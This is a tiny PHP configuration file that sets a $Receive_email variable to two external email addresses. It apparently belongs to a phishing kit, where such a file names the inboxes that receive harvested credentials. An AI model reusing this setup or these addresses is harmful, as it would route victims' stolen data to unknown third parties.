<?php 
$Receive_email="teamwork00@yandex.com,infomjottorneys2@gmail.com";
?>